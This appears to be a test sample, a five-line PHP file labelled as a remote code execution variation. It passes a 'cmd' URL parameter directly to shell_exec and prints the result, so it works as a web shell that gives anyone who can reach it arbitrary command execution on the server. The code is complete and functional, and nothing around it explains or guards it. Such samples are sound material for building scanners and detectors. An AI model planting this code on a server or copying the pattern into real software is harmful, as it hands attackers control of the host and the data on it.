<?php
// RCE test variation #775
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>